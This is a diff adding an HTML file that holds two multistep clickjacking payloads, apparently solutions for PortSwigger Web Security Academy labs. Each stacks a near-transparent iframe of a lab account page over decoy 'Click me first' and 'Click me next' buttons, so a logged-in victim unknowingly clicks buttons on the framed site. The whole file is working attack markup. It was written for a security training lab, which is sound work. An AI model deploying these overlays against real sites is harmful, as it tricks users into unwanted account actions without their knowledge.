@@ -1,0 +1,62 @@
+<style>
+  iframe {
+    position: relative;
+    width: 500px;
+    height: 700px;
+    opacity: 0.0001; /* use 0.1 for alignment, 0.0001 for final */
+    z-index: 2;
+    border: none;
+  }
+  .firstClick, .secondClick {
+    position: absolute;
+    z-index: 1;
+    cursor: pointer;
+    padding: 8px 12px;
+    background: #eee;
+    border-radius: 4px;
+  }
+  /* suggested starting positions (tweak visually) */
+  .firstClick { top: 330px; left: 50px; }
+  .secondClick { top: 285px; left: 225px; }
+</style>
+
+<div style="position:relative; width:500px; height:700px;">
+  <div class="firstClick">Test me first</div>
+  <div class="secondClick">Test me next</div>
+  <iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
+</div>
+
+
+<head>
+<style>
+#victim{
+    position:relative;
+    width:1000px;
+    height:800px;
+    opacity:0.4000;
+    z-index:2;
+}
+#evil_page1{
+    position:absolute;
+    top:515px;
+    left:65px;
+    z-index:1;
+}
+#evil_page2{
+    position:absolute;
+    top:310px;
+    left:200px;
+    z-index:1;
+}
+</style>
+</head>
+<body>
+    <div id="evil_page1">
+        Click me first!
+    </div>
+    <div id="evil_page2">
+        Click me next!
+    </div>
+    <iframe id="victim" src="https://acf51f351e000d2cc0ac03c0004200b8.web-security-academy.net/my-account">
+    </iframe>
+</body>
